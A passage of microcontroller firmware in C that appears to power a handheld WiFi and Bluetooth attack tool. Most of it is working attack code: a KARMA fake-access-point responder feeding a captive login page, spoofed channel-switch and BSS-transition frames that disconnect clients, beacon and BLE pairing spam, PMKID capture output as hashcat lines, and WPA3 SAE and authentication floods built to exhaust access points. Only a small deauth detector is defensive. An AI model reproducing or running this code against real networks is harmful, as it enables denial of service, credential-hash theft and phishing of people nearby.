    for(uint8_t k = 0; k < probes[idx].n; k++)
      if(!strcmp(probes[idx].ssid[k], ssid)) return;
    if(probes[idx].n < 2) {
      strncpy(probes[idx].ssid[probes[idx].n], ssid, 32);
      probes[idx].ssid[probes[idx].n][32] = 0;
      probes[idx].n++;
    }
  }
}

static void promisc_probe_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(len < 24) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if(ftype != 0 || stype != 4) return;          // mgmt, probe request only
  const uint8_t* src = buf + 10;                // addr2
  if(src[0] & 0x01) return;                     // multicast/broadcast sender — skip
  char ssid[33]; ssid[0] = 0;
  unsigned int p = 24;
  while(p + 2 <= len) {
    uint8_t id = buf[p], il = buf[p + 1];
    if(p + 2 + il > len) break;
    if(id == 0) {                               // SSID IE
      int n = il > 32 ? 32 : il;
      memcpy(ssid, buf + p + 2, n);
      ssid[n] = 0;
      break;
    }
    p += 2 + il;
  }
  probe_add(src, ssid);
}

static void probe_stream(int ch) {
  for(uint8_t i = 0; i < probe_n; i++) {
    char line[160];
    int n = snprintf(line, sizeof(line), "PROBE:%02X:%02X:%02X:%02X:%02X:%02X|",
      probes[i].mac[0], probes[i].mac[1], probes[i].mac[2],
      probes[i].mac[3], probes[i].mac[4], probes[i].mac[5]);
    if(probes[i].n == 0) {
      n += snprintf(line + n, sizeof(line) - n, "*");
    } else {
      for(uint8_t k = 0; k < probes[i].n; k++)
        n += snprintf(line + n, sizeof(line) - n, "%s%s", k ? "," : "", probes[i].ssid[k]);
    }
    Serial.println(line); Serial1.println(line);
  }
  String fin = "PROBEDONE: ch=" + String(ch) + " n=" + String((unsigned)probe_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- B7: probe-request flood (raw probe request frames) -------------------------
static void tx_probe_req(const uint8_t* src, const char* ssid) {
  uint8_t f[128]; int n = 0;
  f[n++] = 0x40; f[n++] = 0x00;                 // frame control: probe request
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr1 broadcast
  for(int i = 0; i < 6; i++) f[n++] = src[i];   // addr2 src
  for(int i = 0; i < 6; i++) f[n++] = 0xFF;     // addr3 bssid
  f[n++] = 0x00; f[n++] = 0x00;                 // seq
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID element
  for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
  f[n++] = 0x01; f[n++] = 0x04;                 // supported rates IE
  f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
  wifi_tx_raw_frame(f, n);
}

// Beacon/SSID-flood frames built by hand and pushed through the SAME raw TX path the probe
// and auth frames use. The SDK's wifi_tx_beacon_frame() (wifi_cust_tx.cpp) locks the board up
// hard: 6 beacon frames in a row hang the loop while 60 probe frames in a row are fine, so the
// whole beacon-spam family (custom/random/rickroll/ghost/AP-clone) was dead. This avoids that
// code path entirely. The raw TX buffer only has 0x68-0x28 = 64 usable bytes, so the SSID is
// capped to keep the frame inside it.
#define TX_RAW_MAX_PAYLOAD 64
static const uint8_t TX_BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst,
                              const char* ssid, uint8_t ftype, int chan) {
  int n = 0;
  f[n++] = ftype; f[n++] = 0x00;                // frame control (0x80 beacon / 0x50 probe resp)
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  memcpy(f + n, dst, 6); n += 6;                // addr1 destination
  memcpy(f + n, src, 6); n += 6;                // addr2 source
  memcpy(f + n, src, 6); n += 6;                // addr3 bssid
  f[n++] = 0x00; f[n++] = 0x00;                 // sequence (set by the driver)
  for(int i = 0; i < 8; i++) f[n++] = 0x00;     // timestamp
  f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval
  f[n++] = 0x21; f[n++] = 0x00;                 // capability (ESS)
  // The raw TX staging buffer is only TX_RAW_MAX_PAYLOAD bytes, so the SSID is what has to
  // survive intact; the optional IEs are appended only while they still fit. The DS Parameter
  // Set (our channel) is what makes the SSID appear in a normal scan list.
  int sl = ssid ? (int)strlen(ssid) : 0;
  if(sl > TX_RAW_MAX_PAYLOAD - 40) sl = TX_RAW_MAX_PAYLOAD - 40;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID IE
  for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
  if(n + 6 <= TX_RAW_MAX_PAYLOAD) {             // supported rates IE
    f[n++] = 0x01; f[n++] = 0x04;
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
  }
  if(n + 3 <= TX_RAW_MAX_PAYLOAD) {             // DS parameter set = the channel we transmit on
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = (uint8_t)chan;
  }
  return n;
}

// TX frame staging buffers live in BSS, not on the loop() stack: loop() already carries the
// whole command dispatch and the TX path needs its own stack depth. Putting the frame array
// directly in loop()'s frame wedged the board (observed), while the identical frame sent from
// tx_probe_req() (array inside a called function) went out fine.
static uint8_t tx_stage[128];

static int tx_raw_hex(const char* h) {
  int n = 0;
  for(int i = 0; h[i] && h[i+1] && n < (int)sizeof(tx_stage); i += 2) {
    int hi = hexnib(h[i]), lo = hexnib(h[i+1]);
    if(hi < 0 || lo < 0) break;
    tx_stage[n++] = (uint8_t)((hi << 4) | lo);
  }
  if(n > 0) wifi_tx_raw_frame(tx_stage, n);
  return n;
}

// NOTE (root cause of the "board locks up" bug): wifi_tx_raw_frame()/dump_mgntframe() do NOT
// complete unless the radio is tuned to a channel. Without a wext_set_channel() right before
// the TX the SDK spins forever inside the TX path (board dead: no replies, no reboot, no fault
// print). PROBEFLOOD always worked because it tunes the channel first; APCLONE and the beacon
// spam code did not. Tuning inside this helper means no caller can forget it again.
static void tx_beacon_raw(const uint8_t* src, const uint8_t* dst, const char* ssid, uint8_t ftype, int chan) {
  if(chan < 1 || chan > 165) chan = 6;
  wext_set_channel(WLAN0_NAME, chan);
  int n = build_beacon_frame(tx_stage, src, dst, ssid, ftype, chan);
  if(n > (int)sizeof(tx_stage)) n = (int)sizeof(tx_stage);
  if(n > 0) wifi_tx_raw_frame(tx_stage, n);
}

// --- B1: KARMA / known-beacon responder ---------------------------------------
// Sniff probe requests (promiscuous) and answer every requested SSID with a probe response to the
// requesting client plus a broadcast beacon, both cloning that SSID. The BSSID is derived from the
// SSID so repeated probes keep mapping to the same fake AP. Devices that remember the network see
// it again and can then be pulled into the captive portal (C1 = Trap). TX is deferred to loop():
// the promisc callback runs in the WiFi task, so it only records the request there.
static bool karma_on = false;
static int karma_chan = 6;
static volatile bool karma_pending = false;
static char karma_ssid[33] = {0};
static uint8_t karma_client[6] = {0};
// --- C1: KARMA -> Trap -----------------------------------------------------------------
// Same sniffing as B1, but the first requested SSID is cloned for real: a softAP with that name
// is started and the existing captive-portal plumbing serves the login page, so a device that
// remembers the network can actually associate and land on the portal. Once the AP is up its own
// beacons advertise the SSID, so the raw responses stop (they would also fight the AP's channel).
static bool trap_on = false;
static bool trap_armed = true;
static char trap_ssid[33] = {0};
#define KARMA_SEEN_MAX 8
static char karma_seen[KARMA_SEEN_MAX][33];
static int karma_seen_n = 0;

static void karma_note(const char* s) {
  for(int i = 0; i < karma_seen_n; i++)
    if(strcmp(karma_seen[i], s) == 0) return;
  if(karma_seen_n < KARMA_SEEN_MAX) {
    strncpy(karma_seen[karma_seen_n], s, 32);
    karma_seen[karma_seen_n][32] = 0;
    karma_seen_n++;
  }
}

static void promisc_karma_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(!karma_on || len < 24) return;
  if(((buf[0] >> 2) & 3) != 0) return;    // management frames only
  if(((buf[0] >> 4) & 0x0F) != 4) return; // subtype 4 = probe request
  int p = 24;                             // probe requests have no fixed params before the IEs
  while(p + 2 <= (int)len) {
    int id = buf[p], l = buf[p + 1];
    if(id == 0) {
      if(l == 0 || l > 32 || p + 2 + l > (int)len) return;  // wildcard/empty or malformed
      for(int i = 0; i < l; i++) {
        uint8_t c = buf[p + 2 + i];
        if(c < 32 || c > 126) return;     // only answer printable SSIDs
      }
      memcpy(karma_client, buf + 10, 6);  // addr2 = the probing client
      memcpy(karma_ssid, buf + p + 2, l);
      karma_ssid[l] = 0;
      karma_note(karma_ssid);
      karma_pending = true;
      return;
    }
    p += 2 + l;
  }
}

// --- B2: CSA (channel switch announcement) spoofing ---------------------------
// An unprotected Spectrum Management action frame telling the clients of <bssid> to move to
// <newch>: they leave the AP without any deauth. Clients that require protected CSA (PMF/WPA3)
// ignore it - that is the known limitation, not a bug. The board must transmit on the AP's own
// channel, so the caller tunes it first.
static void csa_send_frame(const uint8_t* bssid, uint8_t newch, uint8_t count, uint8_t mode, const uint8_t* dst) {
  uint8_t f[64];
  int n = 0;
  f[n++] = 0xD0; f[n++] = 0x00;              // frame control: action
  f[n++] = 0x00; f[n++] = 0x00;              // duration
  memcpy(f + n, dst, 6); n += 6;             // addr1: the client (or broadcast)
  memcpy(f + n, bssid, 6); n += 6;           // addr2: source, spoofed as the AP
  memcpy(f + n, bssid, 6); n += 6;           // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;              // sequence (driver fills it)
  f[n++] = 0x00;                             // category: spectrum management
  f[n++] = 0x04;                             // action: channel switch announcement
  f[n++] = 0x25; f[n++] = 0x03;              // CSA information element
  f[n++] = mode;                             // 0 = stop on the old channel, 1 = both channels
  f[n++] = newch;
  f[n++] = count;
  memset(tx_stage, 0, n);
  memcpy(tx_stage, f, n);
  wifi_tx_raw_frame(tx_stage, n);
}

// --- B3: 802.11v BSS transition management (BTM) request -------------------------------
// A WNM action frame (category 0x0A, action 0x07) - what an AP legitimately sends to steer a
// client to another BSS (band steering / load balancing). Spoofed from the target AP it asks a
// client that supports 802.11v to move to a candidate on <newch>, and the candidate is a
// locally-administered phantom BSSID, so the client roams off and finds nothing. No deauth
// frame is involved anywhere: same class of effect as CSA, with CSA's same limit - a client
// that requires protected management frames (PMF/WPA3) ignores it - and the board must already
// be tuned to the AP's channel (the caller does that).
// Layout: action header, dialog token, request mode 0x05 (preferred candidate list +
// disassociation imminent), disassociation timer, validity interval, neighbor report element.
static void btm_send_frame(const uint8_t* bssid, uint8_t newch, const uint8_t* dst) {
  uint8_t f[80];
  int n = 0;
  f[n++] = 0xD0; f[n++] = 0x00;              // frame control: action
  f[n++] = 0x00; f[n++] = 0x00;              // duration
  memcpy(f + n, dst, 6); n += 6;             // addr1: the client (or broadcast)
  memcpy(f + n, bssid, 6); n += 6;           // addr2: source, spoofed as the AP
  memcpy(f + n, bssid, 6); n += 6;           // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;              // sequence (driver fills it)
  f[n++] = 0x0A;                             // category: wireless network management
  f[n++] = 0x07;                             // action: BSS transition management request
  f[n++] = 0x01;                             // dialog token
  f[n++] = 0x05;                             // request mode: candidate list + disassoc imminent
  f[n++] = 0x00; f[n++] = 0x01;              // disassociation timer (LE, 100 TU)
  f[n++] = 0x00;                             // validity interval (beacon intervals)
  f[n++] = 0x34;                             // element: neighbor report (52)
  f[n++] = 0x0D;                             // element length: 13
  f[n++] = (uint8_t)(bssid[0] | 0x02);       // candidate BSSID: locally administered phantom
  f[n++] = bssid[1];                         //  built from the AP's own MAC, so the "sibling"
  f[n++] = bssid[2];                         //  looks plausible but does not exist
  f[n++] = bssid[3];
  f[n++] = bssid[4];
  f[n++] = (uint8_t)(bssid[5] ^ 0x01);
  f[n++] = 0x07; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;  // BSSID info: reachable + secured
  f[n++] = (newch > 14) ? 0x79 : 0x51;       // regulatory class (FCC 2.4 / 5 GHz)
  f[n++] = newch;                            // channel number
  f[n++] = 0x07;                             // PHY type: HT
  memset(tx_stage, 0, n);
  memcpy(tx_stage, f, n);
  wifi_tx_raw_frame(tx_stage, n);
}

static void karma_respond(const char* ssid, const uint8_t* client, int chan) {
  uint8_t bssid[6];
  uint32_t h = 2166136261u;               // FNV-1a -> stable BSSID per SSID
  for(const char* p = ssid; *p; p++) { h ^= (uint8_t)*p; h *= 16777619u; }
  bssid[0] = 0x02;                        // locally administered
  bssid[1] = (h >> 8) & 0xFF;
  bssid[2] = (h >> 16) & 0xFF;
  bssid[3] = (h >> 24) & 0xFF;
  bssid[4] = 0x4B; bssid[5] = 0x4D;       // "KM"
  tx_beacon_raw(bssid, client, ssid, 0x50, chan);   // probe response -> this client
  tx_beacon_raw(bssid, TX_BCAST, ssid, 0x80, chan); // beacon -> passive scanners
}

// --- D2: BLE advert spam (Apple continuity + Microsoft Swift Pair) ---------------
// Packet layouts from https://github.com/Flipper-XFW/Xtreme-Apps ble_spam protocols.
static uint8_t blespam_pkt(uint8_t* p, uint8_t type) {
  if(type == 3) {   // Microsoft Swift Pair
    static const char* names[] = {"Flipper", "Windows", "SwiftPair", "BT-Device"};
    const char* nm = names[random(0, 4)];
    uint8_t nl = (uint8_t)strlen(nm);
    if(nl > 20) nl = 20;
    p[0] = (uint8_t)(6 + nl); p[1] = 0xFF; p[2] = 0x06; p[3] = 0x00;
    p[4] = 0x03; p[5] = 0x00; p[6] = 0x80;
    memcpy(p + 7, nm, nl);
    return (uint8_t)(7 + nl);
  }
  if(type == 1) {   // Apple Nearby Action ("Setup New iPhone", "Join This AppleTV?", ...)
    static const uint8_t actions[] = {0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B};
    p[0] = 10; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x0F; p[5] = 5;
    p[6] = 0xC0;
    p[7] = actions[random(0, 12)];
    for(int i = 0; i < 3; i++) p[8 + i] = (uint8_t)random(0, 256);
    return 11;
  }
  if(type == 2) {   // Apple AirDrop
    p[0] = 23; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x05; p[5] = 18;
    for(int i = 6; i < 14; i++) p[i] = 0x00;
    p[14] = 0x01;
    for(int i = 15; i < 23; i++) p[i] = (uint8_t)random(0, 256);
    return 24;
  }
  // default: Apple Proximity Pair (AirPods / AirTag / Beats ...)
  static const uint16_t models[] = {0x0E20,0x0A20,0x0055,0x0220,0x0F20,0x1320,
                                    0x1420,0x1020,0x0620,0x0320,0x0B20,0x0520};
  uint16_t m = models[random(0, 12)];
  p[0] = 30; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x07; p[5] = 25;
  p[6] = (m == 0x0055) ? 0x05 : 0x07;          // airtag -> 0x05, else "new device"
  p[7] = (uint8_t)((m >> 8) & 0xFF);
  p[8] = (uint8_t)(m & 0xFF);
  p[9] = 0x55;
  p[10] = (uint8_t)((random(0, 10) << 4) + random(0, 10));
  p[11] = (uint8_t)((random(0, 8) << 4) + random(0, 10));
  p[12] = (uint8_t)random(0, 256);
  p[13] = 0x00;
  p[14] = 0x00;
  for(int i = 15; i < 31; i++) p[i] = (uint8_t)random(0, 256);
  return 31;
}

// --- A5: deauth/disassoc sniffer (IDS) ------------------------------------------
// Flags other people's deauth attacks: counts deauth(0x0C)/disassoc(0x0A) frames per
// (src,dst,reason) so the host can list who is knocking whom off, and why.
#define IDS_MAX 16
typedef struct { uint8_t src[6], dst[6]; uint8_t reason; uint16_t count; } ids_t;
static ids_t ids[IDS_MAX];
static uint8_t ids_n = 0;

static void ids_add(const uint8_t* src, const uint8_t* dst, uint8_t reason) {
  for(uint8_t i = 0; i < ids_n; i++)
    if(!memcmp(ids[i].src, src, 6) && !memcmp(ids[i].dst, dst, 6) && ids[i].reason == reason) {
      ids[i].count++;
      return;
    }
  if(ids_n >= IDS_MAX) return;
  memcpy(ids[ids_n].src, src, 6);
  memcpy(ids[ids_n].dst, dst, 6);
  ids[ids_n].reason = reason;
  ids[ids_n].count = 1;
  ids_n++;
}

static void promisc_ids_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if(len < 26) return;
  uint8_t ftype = (buf[0] >> 2) & 3;
  uint8_t stype = (buf[0] >> 4) & 0xF;
  if(ftype != 0) return;
  if(stype != 0x0C && stype != 0x0A) return;   // deauth / disassoc
  ids_add(buf + 10 /*addr2 src*/, buf + 4 /*addr1 dst*/, buf[24]);
}

static void ids_stream(int ch) {
  for(uint8_t i = 0; i < ids_n; i++) {
    char line[96];
    snprintf(line, sizeof(line),
      "DEAUTH:%02X:%02X:%02X:%02X:%02X:%02X>%02X:%02X:%02X:%02X:%02X:%02X|r%u|x%u",
      ids[i].src[0], ids[i].src[1], ids[i].src[2], ids[i].src[3], ids[i].src[4], ids[i].src[5],
      ids[i].dst[0], ids[i].dst[1], ids[i].dst[2], ids[i].dst[3], ids[i].dst[4], ids[i].dst[5],
      (unsigned)ids[i].reason, (unsigned)ids[i].count);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "DEAUTHDONE: ch=" + String(ch) + " n=" + String((unsigned)ids_n);
  Serial.println(fin); Serial1.println(fin);
}

// --- P6: PMKID extraction from EAPOL-Key M1 ----------------------------------
// Clientless PMKID: many WPA2 APs put the PMKID in the RSN key-data KDE of the very
// first EAPOL-Key (M1). We identify M1 (key info ACK set, MIC clear, RSN descriptor)
// and pull the 16-byte PMKID from KDE `dd 14 00 0f ac 04`. If the AP was scanned we
// also emit a ready hashcat -m 22000 line; otherwise the raw PMKID + MACs.
#define PMKID_MAX 8
typedef struct { uint8_t ap[6], sta[6], pmkid[16]; } pmkid_t;
static pmkid_t pmkids[PMKID_MAX];
static volatile uint8_t pmkid_n = 0;
static volatile uint32_t cl_eapol = 0;   // EAPOL frames seen during a clientless grab (debug)

static void hex12(const uint8_t* m, char* out) {
  snprintf(out, 13, "%02x%02x%02x%02x%02x%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void pmkid_handle(const uint8_t* buf, unsigned len) {
  unsigned e;
  if (len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) e = 32;          // + LLC/SNAP -> EAPOL
  else if (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e) e = 34;     // QoS data
  else return;
  if (e + 99 > len) return;                    // EAPOL-Key fixed part is 95 B after hdr
  if (buf[e + 1] != 3) return;                 // EAPOL type = EAPOL-Key
  if (buf[e + 4] != 2) return;                 // RSN key descriptor
  // Key Information is big-endian; ACK = bit 7 (0x0080), MIC = bit 8 (0x0100).
  uint16_t ki = ((uint16_t)buf[e + 5] << 8) | buf[e + 6];
  if (!(ki & 0x0080) || (ki & 0x0100)) return; // M1: ACK set, MIC clear
  uint16_t kdl = ((uint16_t)buf[e + 97] << 8) | buf[e + 98];
  if (kdl < 22 || e + 99 + (unsigned)kdl > len) return;
  const uint8_t* kd = buf + e + 99;
  for (unsigned i = 0; i + 22 <= kdl; i++) {
    if (kd[i] == 0xdd && kd[i+1] == 0x14 && kd[i+2] == 0x00 &&
        kd[i+3] == 0x0f && kd[i+4] == 0xac && kd[i+5] == 0x04) {
      const uint8_t* ap = (buf[1] & 0x02) ? buf + 10 : buf + 16;   // addr2 if FromDS
      const uint8_t* sta = buf + 4;                                // addr1 = receiver
      for (uint8_t k = 0; k < pmkid_n; k++)
        if (!memcmp(pmkids[k].pmkid, kd + i + 6, 16)) return;      // dedupe
      if (pmkid_n >= PMKID_MAX) return;
      memcpy(pmkids[pmkid_n].ap, ap, 6);
      memcpy(pmkids[pmkid_n].sta, sta, 6);
      memcpy(pmkids[pmkid_n].pmkid, kd + i + 6, 16);
      pmkid_n++;
      return;
    }
  }
}

static void promisc_pmkid_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if (len < 34 || ((buf[0] >> 2) & 3) != 2) return;   // data frames only
  if ((buf[30] == 0x88 && buf[31] == 0x8e) || (buf[32] == 0x88 && buf[33] == 0x8e)) cl_eapol++;
  pmkid_handle(buf, len);
}

static void pmkid_stream(int ch) {
  for (uint8_t i = 0; i < pmkid_n; i++) {
    pmkid_t* p = &pmkids[i];
    char ap[13], sta[13], pm[33];
    hex12(p->ap, ap);
    hex12(p->sta, sta);
    for (int k = 0; k < 16; k++) snprintf(pm + k*2, 3, "%02x", p->pmkid[k]);
    String ssid = "";
    for (unsigned j = 0; j < scan_results.size(); j++)
      if (!memcmp(scan_results[j].bssid, p->ap, 6)) { ssid = scan_results[j].ssid; break; }
    if (ssid.length() > 0) {
      String sh = "";
      for (unsigned k = 0; k < ssid.length(); k++) { char b[3]; snprintf(b, 3, "%02x", (uint8_t)ssid[k]); sh += b; }
      String line = "WPA*01*" + String(pm) + "*" + String(ap) + "*" + String(sta) + "*" + sh + "***";
      Serial.println(line); Serial1.println(line);
    } else {
      String line = "PMKID:" + String(ap) + "|" + String(sta) + "|" + String(pm);
      Serial.println(line); Serial1.println(line);
    }
  }
  String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)pmkid_n);
  Serial.println(fin); Serial1.println(fin);
}

// P6 clientless PMKID: raw open-auth + WPA2-PSK assoc to make the AP start the 4-way and
// replay M1 (with the PMKID), then capture it from promisc. No client needed. The SSID is
// required — many APs reject assoc with an empty/wrong SSID.
static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
  wext_set_channel(WLAN0_NAME, ch);
  char macstr[20] = {0};
  wifi_get_mac_address(macstr);            // returns "AA:BB:CC:DD:EE:FF" as a string
  uint8_t sta[6];
  for(int i = 0; i < 6; i++) sta[i] = (uint8_t)strtoul(macstr + i * 3, NULL, 16);
  // Authentication (open system, seq 1)
  uint8_t auth[30];
  memset(auth, 0, sizeof(auth));
  auth[0] = 0xB0;
  memcpy(auth + 4, bssid, 6);
  memcpy(auth + 10, sta, 6);
  memcpy(auth + 16, bssid, 6);
  // The auth body is algorithm (u16 LE) at 26 then sequence (u16 LE) at 28. This used to write
  // 0x01 into the algorithm field, i.e. ask for shared-key authentication with a zero sequence -
  // which is not what an open network expects, so the AP should have rejected it (and many do).
  auth[26] = 0x00; auth[27] = 0x00;   // auth algorithm: open system
  auth[28] = 0x01; auth[29] = 0x00;   // auth sequence: 1
  wifi_tx_raw_frame(auth, 30);
  delay(30);
  // Association request (ESS + Privacy, SSID + rates + RSN WPA2-PSK/CCMP)
  uint8_t f[256];
  int n = 0;
  f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;
  memcpy(f + n, bssid, 6); n += 6;
  memcpy(f + n, sta, 6);   n += 6;
  memcpy(f + n, bssid, 6); n += 6;
  f[n++] = 0x00; f[n++] = 0x00;   // seq (set automatically)
  f[n++] = 0x11; f[n++] = 0x04;   // capability: ESS | Privacy
  f[n++] = 0x0A; f[n++] = 0x00;   // listen interval
  int sl = strlen(ssid);
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;
  memcpy(f + n, ssid, sl); n += sl;
  f[n++] = 0x01; f[n++] = 0x08;
  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
  f[n++] = 0x32; f[n++] = 0x04;
  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
    memcpy(f + n, rsn, 22); n += 22; }
  wifi_tx_raw_frame(f, n);
}

// --- Raw-TX channel guard ---------------------------------------------------------------
// The only real restriction is DFS: 52-140 are radar channels and must not be used for TX.
//
// An earlier version of this guard refused EVERY channel above 14, because pointing a flood at a
// 5 GHz AP appeared to wedge the board. That conclusion was wrong. The wedge came from the old
// "tune once, then send N frames" pattern: the tuning does not survive between raw frames, and the
// SDK then spins forever inside its TX path (exactly the pitfall noted above tx_beacon_raw()).
// Measured after moving the tune inside the loop: 64 beacons on channel 36 complete and the board
// stays up, so 5 GHz raw TX works and 5 GHz targets are allowed.
static bool tx_raw_chan_ok(int ch, const char* who) {
  if(ch >= 1 && ch <= 165 && !is_dfs_channel(ch)) return true;
  String r = String("ERROR: ") + who + " refused: channel " + String(ch) +
             (is_dfs_channel(ch) ? " is DFS (radar, RX only)" : " is out of range 1-165");
  Serial.println(r); Serial1.println(r);
  return false;
}

// --- B4: SAE commit flood (WPA3 denial of service) --------------------------------------
// WPA3 replaces the WPA2 4-way with SAE (Dragonfly). When an AP receives an Authentication frame
// with algorithm 3 (SAE) and sequence 1 (Commit), it must run an elliptic-curve operation on the
// scalar and element the frame carries *before* it can decide they are invalid. So a stream of
// commits from many different source MACs keeps the AP's CPU busy validating points that never
// belonged to anybody - the "dragonblood" denial of service. The values here are random on
// purpose: they are invalid, and that is fine, because the expensive part happens first.
//
// Layout (IEEE 802.11-2016, 9.4.1.1 - Authentication, algorithm 3):
//   auth algorithm (2, LE = 3) | auth sequence (2, LE = 1) | status code (2) |
//   SAE Commit: group id (2, LE) | scalar | element
// Group 19 (NIST P-256, the WPA3 default) is 32 + 64 bytes, which is what every consumer AP uses;
// group 20 (P-384, 48 + 96) does not fit tx_stage, so it is deliberately not offered.
// Args: SAEFLOOD <bssid-12hex> <chan> [count]
#define SAE_GROUP_P256 19
static void sae_send_commit(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t f[144];
  int n = 0;
  f[n++] = 0xB0; f[n++] = 0x00;           // frame control: authentication
  f[n++] = 0x00; f[n++] = 0x00;           // duration
  memcpy(f + n, bssid, 6); n += 6;        // addr1: the AP
  memcpy(f + n, sta, 6); n += 6;          // addr2: the spoofed client
  memcpy(f + n, bssid, 6); n += 6;        // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;           // sequence (driver fills it)
  f[n++] = 0x03; f[n++] = 0x00;           // auth algorithm: SAE
  f[n++] = 0x01; f[n++] = 0x00;           // auth sequence: 1 = commit
  f[n++] = 0x00; f[n++] = 0x00;           // status code: success
  f[n++] = SAE_GROUP_P256; f[n++] = 0x00; // group id: NIST P-256
  // Scalar: random on every frame, so each one costs the AP a different computation.
  for(int i = 0; i < 32; i++) f[n++] = (uint8_t)random(0, 256);
  // Element: the P-256 BASE POINT, i.e. deliberately a valid point. The order matters and it is
  // easy to get wrong: an AP validates the element (on-curve check) BEFORE it derives the shared
  // secret (IEEE 802.11-2016 12.4.5.4; hostapd sae_parse_commit_element_ecc() ->
  // crypto_ec_point_is_on_curve() -> only then sae_process_commit()). A random element is almost
  // certainly off the curve, so it would be rejected cheaply and the flood would cost the AP
  // nothing. With a valid point the AP goes on to the scalar multiplication - the expensive half -
  // and then keeps its SAE state waiting for a confirm that never arrives.
  // The base point is public and fixed (NIST P-256 G, FIPS 186-4 / RFC 5903 3.2.1).
  static const uint8_t gx[32] = {
      0x6B,0x17,0xD1,0xF2,0xE1,0x2C,0x42,0x47,0xF8,0xBC,0xE6,0xE5,0x63,0xA4,0x40,0xF2,
      0x77,0x03,0x7D,0x81,0x2D,0xEB,0x33,0xA0,0xF4,0xA1,0x39,0x45,0xD8,0x98,0xC2,0x96};
  static const uint8_t gy[32] = {
      0x4F,0xE3,0x42,0xE2,0xFE,0x1A,0x7F,0x9B,0x8E,0xE7,0xEB,0x4A,0x7C,0x0F,0x9E,0x16,
      0x2B,0xCE,0x33,0x57,0x6B,0x31,0x5E,0xCE,0xCB,0xB6,0x40,0x68,0x37,0xBF,0x51,0xF5};
  memcpy(f + n, gx, 32); n += 32;
  memcpy(f + n, gy, 32); n += 32;
  memcpy(tx_stage, f, n);
  wifi_tx_raw_frame(tx_stage, n);
}

// --- B5: authentication / association flood --------------------------------------------
// An AP reserves state for every client that starts associating (an association-table slot), and
// that slot is only freed when the entry times out or the client leaves. Blasting authentication
// requests with random source MACs fills the table with clients that do not exist, so the AP has
// no room (or no CPU) for its real ones until they expire. Association requests go further: many
// APs allocate an AID before checking that the authentication really happened, and the null-data
// frame with the power-management bit set then tells the AP the fake client is dozing, which is
// what keeps its entry from being reaped. Only the AP is addressed - no frames go to any client.
// (Flood frame layout follows pmkid_clientless() below, but with the auth algorithm/sequence in
// their correct slots: algorithm 0x0000 = open system at offset 26, seq 1 at offset 28.)
static uint8_t flood_sta[6];

static void flood_mac_rand(void) {
  for(int i = 0; i < 6; i++) flood_sta[i] = (uint8_t)random(0, 256);
  flood_sta[0] = (uint8_t)((flood_sta[0] & 0xFC) | 0x02);   // unicast + locally administered
}

static void flood_tx_auth(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t f[30];
  memset(f, 0, sizeof(f));
  f[0] = 0xB0; f[1] = 0x00;                 // frame control: authentication
  memcpy(f + 4, bssid, 6);                  // addr1: the AP
  memcpy(f + 10, sta, 6);                   // addr2: the spoofed client
  memcpy(f + 16, bssid, 6);                 // addr3: BSSID
  f[26] = 0x00; f[27] = 0x00;               // auth algorithm: open system
  f[28] = 0x01; f[29] = 0x00;               // auth sequence: 1
  wifi_tx_raw_frame(f, 30);
}

static void flood_tx_assoc(const uint8_t* bssid, const uint8_t* sta, const char* ssid) {
  uint8_t f[192];
  int n = 0;
  f[n++] = 0x00; f[n++] = 0x00;             // frame control: association request
  f[n++] = 0x00; f[n++] = 0x00;             // duration
  memcpy(f + n, bssid, 6); n += 6;          // addr1: the AP
  memcpy(f + n, sta, 6); n += 6;            // addr2: the spoofed client
  memcpy(f + n, bssid, 6); n += 6;          // addr3: BSSID
  f[n++] = 0x00; f[n++] = 0x00;             // sequence (driver fills it)
